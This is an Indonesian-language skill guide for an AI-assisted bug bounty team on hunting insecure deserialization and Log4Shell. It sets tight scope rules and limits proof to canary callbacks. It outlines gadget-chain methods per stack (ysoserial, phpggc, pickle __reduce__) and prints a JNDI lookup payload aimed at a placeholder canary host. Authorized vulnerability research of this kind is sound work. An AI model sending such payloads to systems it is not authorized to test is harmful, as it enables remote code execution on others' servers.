# Skill: Perburuan Deserialisasi — Rantai Gadget per Stack (Java, PHP, Python, .NET, Ruby) & JNDI/Log4Shell

> **BELUM DIUJI — dibangun dari riset, bukan pengalaman teruji.** Seluruh isi di bawah ini adalah metodologi dari riset (referensi: `~/workspace/catatan/riset-tambahan-skill-bounty-2026-11-24.md` Bagian 4 kandidat 43, sumber: Claude-BugHunter `hunt-deserialization`, 22 laporan), bukan pengalaman teruji sampai ada temuan yang lolos triase dan dicatat di log. Label ini berlaku untuk semua bagian.

## Pemicu (kapan dipakai)

- Target menerima data serialisasi dari klien: cookie yang tampak ter-encode (Java serialized, PHP serialized, base64 blob), parameter API berisi objek, atau header yang memuat data serialisasi.
- Ada sinyal: error stack trace menyebut `ObjectInputStream`, `unserialize`, `pickle.loads`, `BinaryFormatter`, atau `Marshal.load`; atau cookie berubah secara deterministik saat nilai objek diubah.
- Dipakai SETELAH stack target teridentifikasi — gadget chain yang dipakai harus sesuai stack.

## Pemilik + penanggung jawab

| Peran | Agent | Tugas |
|---|---|---|
| Pengerjaan | **A55** | Mengenali format serialisasi + menguji gadget chain sesuai stack |
| Audit | **A60 Security Auditor** | Memeriksa apakah bukti tiap rantai memenuhi Gerbang 3 |
| Pemimpin | **Muse** | Memutuskan temuan mana yang maju ke triase |

## Sudah tercakup (jangan diduplikat)

- Definisi umum deserialisasi tidak aman sebagai fondasi → skill `fondasi-kerentanan-web-api` menyebutnya sebagai kelas umum (tanpa rantai gadget per stack). Skill ini adalah pendalaman per-stack + pola laporan nyata, bukan pengulangan definisi.
- Injeksi perintah / RCE secara umum → skill `injeksi-perintah-rce`. Deserialisasi di sini adalah JALUR menuju RCE (gadget chain), bukan teknik injeksi perintah itu sendiri.
- SSRF / callback out-of-band → skill `ssrf-oast` (dipakai untuk membuktikan gadget JNDI/Log4Shell lewat callback canary, bukan untuk rantai gadgetnya).
- Analisis statis JS untuk menemukan alur data → skill `analisis-statis-js`.

## Aturan keras

1. **Hanya program bounty resmi in-scope** (Muse/Meta, OpenAI Safety, 0din, Google AI VRP, ViKernel, huntr). Pastikan seluruh endpoint yang menerima data serialisasi berada dalam in-scope program sebelum pengujian dimulai.
2. **Hanya akun sendiri + canary palsu.** Gunakan hanya akun uji milik sendiri dan server canary milik sendiri untuk callback. Jangan pernah menguji deserialisasi terhadap data/sesi orang lain.
3. **Tanpa data orang lain.**
4. **Tanpa uji korban (victim-agent fraud tests DIBLOKIR — jangan dicoba).**
5. **Tanpa DoS / resource exhaustion** — dilarang pengujian yang mengganggu ketersediaan layanan atau menghabiskan kuota secara berlebihan. Gadget chain yang memicu loop / alokasi besar DILARANG.
6. **Tanpa payload di permukaan publik.** Gadget payload hanya dikirim ke endpoint in-scope milik target, tidak di-host di permukaan publik.
7. **Validasi human-in-the-loop (AI bantu, manusia putuskan dan validasi).**
8. **Tanpa laporan tanpa persetujuan Cipta.**
9. **Patuhi larangan otomasi program (huntr "Humans only"; Gray Swan dilewati total — jangan buat skill untuknya).**
10. **Larang aksi destruktif (DROP, DELETE, hapus/ubah data)** — pembuktian harus aman dan read-only. Khusus deserialisasi: gadget chain yang dipakai HANYA gadget pembuktian aman (baca file non-sensitif milik sendiri / callback canary / `sleep` terukur singkat) — JANGAN gadget yang menghapus, menulis, atau mengubah data, dan JANGAN RCE penuh yang menjalankan perintah arbitrer di server target. Bukti RCE cukup berupa callback canary atau pembacaan yang membuktikan eksekusi, lalu BERHENTI.
11. **Teknik web klasik ini untuk program web/API klasik (huntr dsb.), BUKAN untuk bounty agen AI** — kecuali dinyatakan berlaku di skill itu.

## Langkah + gerbang

### Gerbang 1 — Kenali format serialisasi + stack target

1. **Kenali format dari traffic/cookie:** Java serialized (magic bytes `ac ed 00 05`), PHP serialized (`O:8:"Class":...`, `a:`, `s:`), Python pickle (`\x80\x04\x95...`), .NET BinaryFormatter, Ruby Marshal (`\x04\x08`). Decode base64/hex bila perlu — hanya data dari sesi akun uji sendiri.
2. **Identifikasi stack:** dari header respons (`X-Powered-By`, `Server`), error page, dan pola cookie. Catat library yang mungkin ada (ysoserial gadget, phpggc gadget) — jangan menebak buta; satu gadget chain = satu hipotesis.
3. **Standar lulus:** format serialisasi + stack tercatat. Tidak ada data serialisasi yang diterima dari klien = STOP, skill ini tidak berlaku.

### Gerbang 2 — Uji gadget chain sesuai stack (satu rantai = satu putaran, gadget aman saja)

Uji berurutan; tiap rantai dicoba dari state bersih. Gadget yang dipakai HANYA gadget pembuktian aman (callback canary / baca non-sensitif / sleep singkat).

**A. Java — ysoserial gadget chain:** bangun payload dengan gadget yang sesuai library target (mis. CommonsCollections, Spring) dengan aksi pembuktian aman: callback HTTP ke server canary milik sendiri. **Terbukti bila:** callback canary diterima saat payload dikirim. Jangan pakai gadget yang menulis/menghapus file.

**B. PHP — phpggc object injection:** kirim objek serialisasi PHP dengan magic method (`__wakeup`, `__destruct`, `__unserialize`) yang memicu callback canary. **Terbukti bila:** callback canary diterima / perilaku objek teramati berubah sesuai rantai. Jangan pakai gadget yang menulis file atau mengeksekusi perintah.

**C. Python — pickle menuju RCE:** kirim pickle dengan `__reduce__` yang memicu callback canary (bukan perintah destruktif). **Terbukti bila:** callback canary diterima. Pickle yang menjalankan perintah arbitrer penuh DILARANG — cukup callback.

**D. .NET — BinaryFormatter:** kirim objek .NET serialisasi dengan gadget yang memicu callback canary. **Terbukti bila:** callback canary diterima.

**E. Ruby — Marshal.load:** kirim objek Marshal dengan rantai yang memicu callback canary. **Terbukti bila:** callback canary diterima.

**F. JNDI / Log4Shell:** bila target mencatat input pengguna ke logger (Log4j), kirim string JNDI canary (`${jndi:ldap://canary-milik-sendiri/...}`) ke field yang dicatat. **Terbukti bila:** callback LDAP/DNS canary diterima di server milik sendiri. Jangan arahkan JNDI ke server pihak ketiga.

### Gerbang 3 — Gerbang validasi laporan

1. **Dampak keamanan nyata — standar lulus:** callback canary diterima ATAU eksekusi gadget pembuktian aman teramati (bukan sekadar error/deserialisasi gagal). **TOLAK** = hanya error 500 / stack trace tanpa eksekusi gadget.
2. **Reproduksibilitas deterministik — standar lulus:** ulangi rantai yang sama minimal 2× dari state bersih. Gagal direproduksi = TOLAK.
3. **Higienitas bukti — standar lulus:** sensor token sesi dan data pribadi pada log HTTP sebelum dilampirkan (`[REDACTED]`); log callback canary dilampirkan sebagai bukti (hanya timestamp + identifier canary, tanpa data sensitif). Bukti tanpa sensor = TIDAK BOLEH maju ke laporan.

Hanya temuan yang lolos ketiga gerbang di atas yang diteruskan ke `penilaian-cvss` → `artikulasi-dampak-bisnis` → `triase-duplikat` → `laporan-poc-otomatis` → audit A60 → tinjau manusia 2–3 menit → persetujuan Cipta → kirim.

## Alat

| Alat | Cara pakai |
|---|---|
| Akun uji sendiri | Wajib; semua payload dikirim dalam sesi akun uji sendiri. |
| ysoserial / phpggc (di lab sendiri) | Membangun gadget chain sesuai stack; hanya gadget pembuktian aman. |
| Server canary milik sendiri (OAST) | Satu-satunya tujuan callback; catat timestamp + identifier canary. |
| Proxy HTTP (Burp/mitmproxy) | Mengirim payload serialisasi; simpan raw request/response. |
| `~/workspace/catatan/log-bug-bounty.md` | Log format serialisasi + stack + rantai diuji + callback + keputusan gerbang. |

## Format output

Tulis ke `~/workspace/catatan/log-bug-bounty.md` (bagian per tanggal) dengan format:

```
Target: [program + endpoint]
Format serialisasi: [Java / PHP / Python pickle / .NET / Ruby Marshal / JNDI]
Stack: [library/framework yang teridentifikasi + bukti]
Rantai diuji: [A/B/C/D/E/F + nama rantai + gadget + aksi pembuktian aman]
Callback canary: [diterima: ya/tidak | timestamp | identifier]
Keputusan gerbang: [lolos / ditolak + alasan]
Status: [dipetakan / diuji / terbukti / dilaporkan / ditolak]
```

Format judul laporan (bila maju): `[Stack] - Deserialisasi tidak aman pada [endpoint] memungkinkan [eksekusi gadget / RCE]`. Isi laporan: Ringkasan (format + stack + gadget); Langkah Reproduksi (akun uji + payload gadget aman + log callback canary); Rekomendasi Perbaikan (jangan deserialisasi data dari klien yang tidak tepercaya; pakai format aman — JSON dengan schema validation; tanda tangani data serialisasi bila harus dipakai; patch Log4j / nonaktifkan JNDI lookup).

## Batasan yang diketahui

- Metodologi ini dari riset (Claude-BugHunter `hunt-deserialization`, 22 laporan), bukan pengalaman teruji — tiap rantai butuh satu kasus nyata yang lolos triase sebelum label BELUM DIUJI dicabut.
- Gadget chain sangat bergantung pada library + versi yang terpasang di target; rantai yang gagal di satu target bisa berhasil di target lain — catat library/versi yang diuji agar tidak mengulang rantai yang sama di stack yang sama.
- Pembuktian dibatasi gadget aman (callback canary) — jangan pernah menjalankan RCE penuh di server target, walau program mengizinkan PoC.

## Available connectors

- Browser (`browser.search`, `browser.open`) — riset dokumentasi publik program dan pola laporan deserialisasi.

## Websites

- Dokumentasi scope program bounty yang sedang diuji (per program, baca pasal scope sebelum menguji).

## Alternatives for better results

- Bila target bukan deserialisasi melainkan injeksi perintah langsung, pakai `injeksi-perintah-rce`.
- Bila callback out-of-band perlu didalami, pakai `ssrf-oast`.
